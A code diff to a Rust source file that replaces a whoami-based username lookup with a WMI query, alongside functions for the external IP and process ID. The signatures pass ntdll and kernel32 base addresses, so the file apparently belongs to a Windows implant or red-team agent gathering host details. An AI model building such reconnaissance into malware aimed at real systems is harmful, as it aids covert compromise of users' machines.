@@ -335,26 +335,40 @@ pub fn get_external_ip(ntdll: usize, kernel32: usize) -> String {
     ip
 } //http version
 
+use wmi::{COMLibrary, Variant, WMIConnection};
+use std::collections::HashMap;
+//after i get this working, i'm going to write a seperate tool, a WMI query runner, 
+//that can be used for testing WMI queries and getting data.
 pub fn get_username() -> String {
-    // Get the combined username and privileges
-    let full_string = whoami::get_username_ntapi().unwrap();
+    //changed my mind about reusing the whoami crate. 
+    //instead we'll use WMI to get the username
 
-    // Split the full string into a vector of strings
-    let parts: Vec<&str> = full_string.split('\n').collect();
+    let query = "SELECT UserName FROM Win32_ComputerSystem";
+    let com_con = match COMLibrary::new() {
+        Ok(con) => con,
+        Err(_) => return "Error initializing COM Library".to_string(),
+    };
 
-    // The first part is the username
-    let username = parts[1].to_string();
+    let wmi_con = match WMIConnection::new(com_con.into()) {
+        Ok(con) => con,
+        Err(_) => return "Error connecting to WMI".to_string(),
+    };
 
-    // Check if the user has admin privileges
-    if parts[1..]
-        .iter()
-        .any(|&s| s.trim_end_matches('\0') == "SeTakeOwnershipPrivilege")
-    {
-        // If the user has admin privileges, append an asterisk to the username
-        return format!("{}*", username);
+    let results: Vec<HashMap<String, Variant>> = match wmi_con.raw_query(query) {
+        Ok(results) => results,
+        Err(_) => return "Error executing WMI query".to_string(),
+    };
+
+    if let Some(result) = results.first() {
+        if let Some(Variant::String(username)) = result.get("UserName") {
+            username.clone()
+        } else {
+            "Unknown username".to_string()
+        }
+    } else {
+        "Unknown username".to_string()
     }
 
-    username
 }
 
 pub fn get_pid() -> String {
